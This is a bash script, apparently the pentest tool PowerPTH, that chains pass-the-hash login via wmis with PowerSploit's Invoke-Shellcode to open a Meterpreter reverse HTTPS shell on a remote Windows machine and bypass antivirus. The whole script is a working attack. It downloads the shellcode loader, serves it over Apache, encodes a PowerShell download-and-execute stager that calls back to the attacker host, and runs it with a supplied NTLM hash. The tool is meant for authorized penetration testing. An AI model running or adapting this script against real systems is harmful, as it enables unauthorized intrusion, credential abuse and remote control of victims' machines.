#!/bin/bash
if [ $# -ne 5 ]
then
	echo "PowerPTH: Combines PTH-Suite and PowerSploit for remote AV-bypass with Meterpreter"
	echo "                   by Chris Campbell (@obscuresec)                                "
	echo "                             BSD 3-Clause                                         "
	echo "    Special thanks to the developers of PTH-Suite & PowerSploit (Skip and Matt)   "
	echo " "
	echo " "
	echo "Usage: ./PowerPTH.sh RHOST Username Hash LHOST LPORT"
	echo "Example: ./PowerPTH.sh 192.168.1.2 domain/administrator 00000000000000000000000000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 192.168.1.1 443"
	echo "Make sure you start a multi/handler:"
	echo "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443"
	exit 1
fi

len=${#3}
if [ $len -ne 65 ]
then
	echo "Hash should be supplied in the LM:NT format and should be 65 characters total"
	exit 1
fi

check=`netstat -ln | grep ":$5 " | wc -l`
if [ "$check" -ge 1 ]
then
	echo "Port $5 is in use. Kill the process or specify another port"
	exit 1
fi

if [ ! "$5" -ge 1 ] && [ ! "$5" -le 65535 ]
then
	echo "Local port for handler must be between 1-65535."
	exit 1
fi

rhost=$1
user=$2
hash=$3
lhost=$4
lport=$5

result=`pgrep apache`
if [[ -z "$result" ]]
then 
	echo "Apache is not started, starting the apache service..."
	service apache2 start
fi

portcheck=`nmap -p135 $rhost | grep open | wc -l`
if [ "$portcheck" -eq 0 ]
then
	echo "TCP 135 is not open on $rhost"
	exit 1
else
	echo "The remote port is open but other used ports may not be!"
fi

#download invoke-shellcode from github and save as /var/www/plugin
wget -O /var/www/plugin https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1

#append a call to the Invoke-Shellcode function with the proper arguments
func="Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force"
echo "$func" >> /var/www/plugin
strings -es /var/www/plugin

#base64 encode the stager scriptblock
scriptblock="iex (New-Object Net.WebClient).DownloadString("http://$lhost/plugin")"
echo "The stager command is $scriptblock"
encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"
echo "The encoded scriptblock is $encode"
command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
echo "The commandline syntax is $command"

sleep 3
#execute wmis -U "$user"%"$hash" //"$rhost" "$command"
/pentest/passwords/pth/bin/wmis -U $user%$hash //$rhost "$command"

#echo "Starting the multi handler"
#msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
#May add this back, but it creates a race condition with the wmis command
